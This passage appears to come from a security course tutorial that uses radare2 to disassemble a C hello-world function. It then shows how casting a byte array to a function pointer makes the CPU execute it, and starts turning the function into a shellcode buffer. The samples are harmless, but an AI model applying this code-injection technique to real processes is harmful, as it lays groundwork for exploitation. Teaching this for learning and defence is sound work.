<p>It contains a couple of functions right. One is the classical main function, the other one just prints the hello world. Let’s inspect this second one:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x7f4653774090</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">s</span> <span class="n">sym</span><span class="p">.</span><span class="n">hello</span>
<span class="p">[</span><span class="mh">0x5561e0c6c6aa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">CALL</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x5561e0c6c707</span>
<span class="err">┌</span> <span class="mi">84</span><span class="o">:</span> <span class="n">sym</span><span class="p">.</span><span class="n">hello</span> <span class="p">();</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_14h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x14</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_ch</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6aa</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6ab</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6ae</span>      <span class="mi">4883</span><span class="n">ec20</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x20</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6b2</span>      <span class="mi">64488</span><span class="n">b042528</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6bb</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6bf</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6c1</span>      <span class="mi">48</span><span class="n">b868656c6c</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x6f77206f6c6c6568</span> <span class="p">;</span> <span class="err">'</span><span class="n">hello</span> <span class="n">wo</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6cb</span>      <span class="mi">488945</span><span class="n">ec</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6cf</span>      <span class="n">c745f4726c64</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mh">0x646c72</span> <span class="p">;</span> <span class="err">'</span><span class="n">rld</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6d6</span>      <span class="mi">488</span><span class="n">d45ec</span>       <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6da</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6dd</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6e2</span>      <span class="n">e899feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span>     <span class="p">;</span> <span class="kt">int</span> <span class="n">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6e7</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6e8</span>      <span class="mi">488</span><span class="n">b45f8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x5561e0c6c6ec</span>      <span class="mi">644833042528</span><span class="p">.</span>  <span class="n">xor</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x5561e0c6c6f5</span>      <span class="mi">7405</span>           <span class="n">je</span> <span class="mh">0x5561e0c6c6fc</span>
<span class="err">│</span>       <span class="err">│</span>   <span class="mh">0x5561e0c6c6f7</span>      <span class="n">e874feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">__stack_chk_fail</span> <span class="p">;</span> <span class="kt">void</span> <span class="n">__stack_chk_fail</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="err">│</span>       <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x5561e0c6c6fc</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x5561e0c6c6fd</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x5561e0c6c6aa</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>As you can see, everyting is kind of “self-contained” inside this function. The string is “generated” and loaded inside the function, original register/stack values regarding to the calling block of code are kept/restored and calls (to printf) reference symbols that will be “common” in unix systems…</p>

<p>As you see the string is self generated in memory, would it be any way to self generate actual code in memory in a similar way?</p>

<p><em>indeed</em></p>

<p>If you look at the disasm, you’ll see the opcodes right in the second column, that is essence of the binary program, that is what the “cpu” sees and deals with, so if we can just set a buffer containing the right set of opcodes in memory and manage to move the execution pointer there, common sense tells us that those will be executed as actual code. Again, we’ll go in-depth on the topic further in the course but I think you get the main idea now.</p>

<p>Let’s look at one simple example then go back to our hello world</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include&lt;string.h&gt;
#include &lt;stdint.h&gt;
</span>
<span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">b2</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x90</span>
<span class="p">};</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
    <span class="n">func</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="p">)())</span> <span class="n">b2</span><span class="p">;</span>
    <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="o">*</span><span class="n">func</span><span class="p">)();</span>
    
<span class="p">}</span>
</code></pre></div></div>
<p>So this program declares an array of (hex) bytes then declares a magic function that will basically set the instruction pointer at the beginning of the array. Let’s see it inside r2, it will make more sense.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x557a8fb295fa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">entry0</span> <span class="err">@</span> <span class="mh">0x557a8fb2950d</span>
<span class="err">┌</span> <span class="mi">33</span><span class="o">:</span> <span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">);</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="mh">0x557a8fb295fa</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x557a8fb295fb</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x557a8fb295fe</span>      <span class="mi">4883</span><span class="n">ec10</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x10</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29602</span>      <span class="mi">488</span><span class="n">d059b0000</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="n">obj</span><span class="p">.</span><span class="n">b2</span>         <span class="p">;</span> <span class="mh">0x557a8fb296a4</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29609</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x557a8fb2960d</span>      <span class="mi">488</span><span class="n">b55f8</span>       <span class="n">mov</span> <span class="n">rdx</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29611</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29616</span>      <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29618</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29619</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x557a8fb2961a</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x557a8fb295fa</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>If you know a bit about asm and opcodes you’ll see that 0x90 is the opcode for the nop instruction, the nop instruction simply does nothing.</p>

<p>The program starts by moving the pointer to an address to rax = 0x557a8fb296a4</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x557a8fb295fa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pxw</span> <span class="err">@</span> <span class="mh">0x557a8fb296a4</span>
<span class="mh">0x557a8fb296a4</span>  <span class="mh">0x90909090</span> <span class="mh">0x3b031b01</span> <span class="mh">0x0000003c</span> <span class="mh">0x00000006</span>  <span class="p">.......;</span><span class="o">&lt;</span><span class="p">.......</span>
</code></pre></div></div>
<p>And that contains our nop-buffer. After a couple of instructions the programm will jump there by a call.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">│</span>           <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29616</span> <span class="n">b</span>    <span class="n">ffd2</span>           <span class="n">call</span> <span class="n">rdx</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29618</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x557a8fb29619</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x557a8fb2961a</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x557a8fb29616</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">dr</span> <span class="n">rdx</span>
<span class="mh">0x557a8fb296a4</span>
</code></pre></div></div>
<p>And as the bytes of our hex buffer can easily be translated to instructions, the program will “read it” as executable code as you see here:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x557a8fb29616</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">ds</span>
<span class="p">[</span><span class="mh">0x557a8fb296a4</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pd</span> <span class="mi">10</span>
            <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x557a8fb29602</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">b2</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rdx</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">rip</span><span class="o">:</span>
            <span class="mh">0x557a8fb296a4</span>      <span class="mi">90</span>             <span class="n">nop</span>
            <span class="mh">0x557a8fb296a5</span>      <span class="mi">90</span>             <span class="n">nop</span>
            <span class="mh">0x557a8fb296a6</span>      <span class="mi">90</span>             <span class="n">nop</span>
            <span class="mh">0x557a8fb296a7</span>      <span class="mi">90</span>             <span class="n">nop</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">section</span><span class="p">..</span><span class="n">eh_frame_hdr</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">segment</span><span class="p">.</span><span class="n">GNU_EH_FRAME</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="p">.</span><span class="n">eh_frame_hdr</span><span class="o">:</span>
            <span class="p">;</span><span class="o">--</span> <span class="n">__GNU_EH_FRAME_HDR</span><span class="o">:</span>
            <span class="mh">0x557a8fb296a8</span>      <span class="mo">011</span><span class="n">b</span>           <span class="n">add</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rbx</span><span class="p">],</span> <span class="n">ebx</span>    <span class="p">;</span> <span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="n">section</span> <span class="n">size</span> <span class="mi">60</span> <span class="n">named</span> <span class="p">.</span><span class="n">eh_frame_hdr</span>
            <span class="mh">0x557a8fb296aa</span>      <span class="mo">033</span><span class="n">b</span>           <span class="n">add</span> <span class="n">edi</span><span class="p">,</span> <span class="n">dword</span> <span class="p">[</span><span class="n">rbx</span><span class="p">]</span>
            <span class="mh">0x557a8fb296ac</span>      <span class="mi">3</span><span class="n">c00</span>           <span class="n">cmp</span> <span class="n">al</span><span class="p">,</span> <span class="mi">0</span>
</code></pre></div></div>
<p>Nops will be executed and then the weird add dword [rbx], ebx  that corresponds to some weird memory initialization will be executed, as the code below there does not make any sense because of that, the program will likely crash, but you get the point right? What if we manage to create an hex buffer that actually represents a valid function, a function that gets rid of the stack and returns to the calling one?</p>

<p>Let’s do it so,</p>

<p>As in the previous program the hello function was somehow “self-contained” we can “convert-it into shellcode”</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55ef096056aa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span>
            <span class="p">;</span> <span class="n">CALL</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">main</span> <span class="err">@</span> <span class="mh">0x55ef09605707</span>
<span class="err">┌</span> <span class="mi">84</span><span class="o">:</span> <span class="n">sym</span><span class="p">.</span><span class="n">hello</span> <span class="p">();</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_14h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x14</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_ch</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0xc</span>
<span class="err">│</span>           <span class="p">;</span> <span class="n">var</span> <span class="kt">int64_t</span> <span class="n">var_8h</span> <span class="err">@</span> <span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span>
<span class="err">│</span>           <span class="mh">0x55ef096056aa</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
<span class="err">│</span>           <span class="mh">0x55ef096056ab</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
<span class="err">│</span>           <span class="mh">0x55ef096056ae</span>      <span class="mi">4883</span><span class="n">ec20</span>       <span class="n">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x20</span>
<span class="err">│</span>           <span class="mh">0x55ef096056b2</span>      <span class="mi">64488</span><span class="n">b042528</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55ef096056bb</span>      <span class="mi">488945</span><span class="n">f8</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55ef096056bf</span>      <span class="mi">31</span><span class="n">c0</span>           <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="err">│</span>           <span class="mh">0x55ef096056c1</span>      <span class="mi">48</span><span class="n">b868656c6c</span><span class="p">.</span>  <span class="n">movabs</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x6f77206f6c6c6568</span> <span class="p">;</span> <span class="err">'</span><span class="n">hello</span> <span class="n">wo</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55ef096056cb</span>      <span class="mi">488945</span><span class="n">ec</span>       <span class="n">mov</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">],</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55ef096056cf</span>      <span class="n">c745f4726c64</span><span class="p">.</span>  <span class="n">mov</span> <span class="n">dword</span> <span class="p">[</span><span class="n">var_ch</span><span class="p">],</span> <span class="mh">0x646c72</span> <span class="p">;</span> <span class="err">'</span><span class="n">rld</span><span class="err">'</span>
<span class="err">│</span>           <span class="mh">0x55ef096056d6</span>      <span class="mi">488</span><span class="n">d45ec</span>       <span class="n">lea</span> <span class="n">rax</span><span class="p">,</span> <span class="p">[</span><span class="n">var_14h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55ef096056da</span>      <span class="mi">4889</span><span class="n">c7</span>         <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
<span class="err">│</span>           <span class="mh">0x55ef096056dd</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">│</span>           <span class="mh">0x55ef096056e2</span>      <span class="n">e899feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">printf</span>     <span class="p">;</span> <span class="kt">int</span> <span class="n">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x55ef096056e7</span>      <span class="mi">90</span>             <span class="n">nop</span>
<span class="err">│</span>           <span class="mh">0x55ef096056e8</span>      <span class="mi">488</span><span class="n">b45f8</span>       <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="p">[</span><span class="n">var_8h</span><span class="p">]</span>
<span class="err">│</span>           <span class="mh">0x55ef096056ec</span>      <span class="mi">644833042528</span><span class="p">.</span>  <span class="n">xor</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x28</span><span class="p">]</span>
<span class="err">│</span>       <span class="err">┌─</span><span class="o">&lt;</span> <span class="mh">0x55ef096056f5</span>      <span class="mi">7405</span>           <span class="n">je</span> <span class="mh">0x55ef096056fc</span>
<span class="err">│</span>       <span class="err">│</span>   <span class="mh">0x55ef096056f7</span>      <span class="n">e874feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">__stack_chk_fail</span> <span class="p">;</span> <span class="kt">void</span> <span class="n">__stack_chk_fail</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="err">│</span>       <span class="err">└─</span><span class="o">&gt;</span> <span class="mh">0x55ef096056fc</span>      <span class="n">c9</span>             <span class="n">leave</span>
<span class="err">└</span>           <span class="mh">0x55ef096056fd</span>      <span class="n">c3</span>             <span class="n">ret</span>
<span class="p">[</span><span class="mh">0x55ef096056aa</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>Once inside it in r2 we’ll use pc</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x55ef096056aa</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pc</span>
<span class="cp">#define _BUFFER_SIZE 256
</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="n">buffer</span><span class="p">[</span><span class="n">_BUFFER_SIZE</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span>
  <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span>
  <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span>
  <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span>
  <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span>
  <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span>
  <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span>
  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span>
  <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span>
  <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span>
  <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span>
